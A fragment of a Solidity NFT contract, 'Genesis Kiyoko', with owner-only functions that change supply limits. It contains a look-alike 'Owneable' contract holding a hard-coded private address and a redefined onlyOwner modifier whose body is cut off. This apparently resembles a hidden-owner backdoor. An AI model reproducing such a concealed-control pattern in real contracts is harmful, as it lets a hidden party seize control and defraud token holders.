 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0x8188c596C733C287dDB7F36803e0963668993dbF;
    modifier onlyOwner() {
...
contract GenesisKiyoko is ERC721A, Owneable {

    string public baseURI = "https://gateway.pinata.cloud/ipfs/QmecARYjFif1PTgrPkeiwtfEaHViH4tfRu4JUkeUz9NHVr";
    string public contractURI = "https://gateway.pinata.cloud/ipfs/QmecARYjFif1PTgrPkeiwtfEaHViH4tfRu4JUkeUz9NHVr";
    ...
    constructor() ERC721A("Genesis Kiyoko By Yajuu", "KIYOKO") {}
    ...
    function configkiyokomax(uint256 newSupply) public onlyOwner {
        MAX_SUPPLY = newSupply;
    }

    function configfreekiyoko(uint256 newFreesupply) public onlyOwner {
